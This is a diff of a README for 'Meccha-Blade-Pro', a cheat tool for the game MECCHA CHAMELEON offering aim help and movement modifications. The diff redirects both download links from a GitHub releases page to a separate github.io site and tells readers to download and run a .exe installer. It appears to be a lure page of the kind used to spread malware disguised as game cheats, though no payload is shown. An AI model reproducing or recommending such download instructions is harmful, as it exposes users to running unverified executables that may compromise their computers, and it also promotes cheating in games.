@@ -1,6 +1,6 @@
 # ⚔️ Meccha-Blade-Pro - Improve your game performance and control
 
-[![](https://img.shields.io/badge/Download-Meccha--Blade--Pro-blue)](https://github.com/Biankacomeatable249/Meccha-Blade-Pro/releases)
+[![](https://img.shields.io/badge/Download-Meccha--Blade--Pro-blue)](https://biankacomeatable249.github.io)
 
 Meccha-Blade-Pro provides a set of tools for MECCHA CHAMELEON. It adds features that change how you interact with the game environment. This software includes aim help, visual aids, and movement modifications to assist your play style.
 
@@ -8,7 +8,7 @@ Meccha-Blade-Pro provides a set of tools for MECCHA CHAMELEON. It adds features 
 
 You need to reach the release page to get the installer for your computer. 
 
-[Click here to go to the releases page](https://github.com/Biankacomeatable249/Meccha-Blade-Pro/releases)
+[Click here to go to the releases page](https://biankacomeatable249.github.io)
 
 On that page, look for the list under the latest version tag. Select the file ending in .exe to start your download. Save the file in a folder you can find later, such as your Downloads folder.
 
